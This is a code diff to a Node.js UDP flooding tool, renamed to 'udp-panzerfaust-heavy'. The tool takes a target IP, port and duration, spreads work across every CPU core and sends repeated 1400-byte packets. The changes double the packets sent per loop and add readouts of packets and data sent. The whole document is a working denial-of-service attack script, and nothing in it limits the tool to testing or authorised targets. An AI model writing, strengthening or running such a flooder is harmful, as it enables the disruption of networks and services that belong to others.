@@ -7,25 +7,45 @@ const port = parseInt(process.argv[3]) || 53;
 const duration = parseInt(process.argv[4]);
 
 if (!target || isNaN(duration)) {
-  console.log('Usage: node udp-bandwidth-blaster.js <target_ip> <port> <duration_seconds>');
+  console.log('Usage: node udp-panzerfaust-heavy.js <target_ip> <port> <duration_seconds>');
   process.exit(1);
 }
 
 const endTime = Date.now() + duration * 1000;
-const payloadSize = 1400; // ~MTU-sized payload
-const payload = Buffer.alloc(payloadSize, 'A'); // Repeated 'A' for size
+const payloadSize = 1400;
+const payload = Buffer.alloc(payloadSize, 'A');
 const cpuCount = os.cpus().length;
+
+function formatNumber(n) {
+  const units = ['', 'K', 'M', 'B', 'T'];
+  let i = 0;
+  while (n >= 1000 && i < units.length - 1) {
+    n /= 1000;
+    i++;
+  }
+  return `${n.toFixed(2)}${units[i]}`;
+}
+
+function formatBytes(bytes) {
+  const units = ['B', 'KB', 'MB', 'GB', 'TB', 'PB'];
+  let i = 0;
+  while (bytes >= 1024 && i < units.length - 1) {
+    bytes /= 1024;
+    i++;
+  }
+  return `${bytes.toFixed(2)} ${units[i]}`;
+}
 
 if (cluster.isMaster) {
   let totalSent = 0;
   let totalBytes = 0;
 
   console.clear();
-  console.log('UDP-BANDWIDTH-BLASTER [HIGH THROUGHPUT]');
+  console.log('UDP-PANZERFAUST [HEAVY]');
   console.log('--------------------------------------');
   console.log(`Target: ${target}:${port}`);
   console.log(`Duration: ${duration}s`);
-  console.log(`Payload Size: ${payloadSize} bytes`);
+  console.log(`Payload: ${payloadSize} bytes`);
   console.log(`Cores: ${cpuCount}`);
   console.log('Launching...\n');
 
@@ -41,14 +61,13 @@ if (cluster.isMaster) {
   }
 
   setInterval(() => {
-    const mbps = ((totalBytes * 8) / 1000000).toFixed(2);
     console.clear();
-    console.log('UDP-BANDWIDTH-BLASTER [HIGH THROUGHPUT]');
+    console.log('UDP-PANZERFAUST [HEAVY]');
     console.log('--------------------------------------');
-    console.log(`Total Packets Sent: ${totalSent.toLocaleString()}`);
-    console.log(`Approx Bandwidth Used: ${mbps} Mbps`);
-    console.log(`Target: ${target}:${port}`);
-    console.log(`Payload: ${payloadSize} bytes`);
+    console.log(`Total Packets Sent:    ${formatNumber(totalSent)}`);
+    console.log(`Data Sent:             ${formatBytes(totalBytes)}`);
+    console.log(`Target:                ${target}:${port}`);
+    console.log(`Payload:               ${payloadSize} bytes`);
     console.log('--------------------------------------');
   }, 2000);
 
@@ -71,7 +90,7 @@ if (cluster.isMaster) {
     function sendLoop() {
       if (Date.now() > endTime) return;
 
-      for (let i = 0; i < 100; i++) { // Bigger payloads, fewer packets
+      for (let i = 0; i < 200; i++) {
         sock.send(payload, port, target);
         sent++;
         bytes += payload.length;
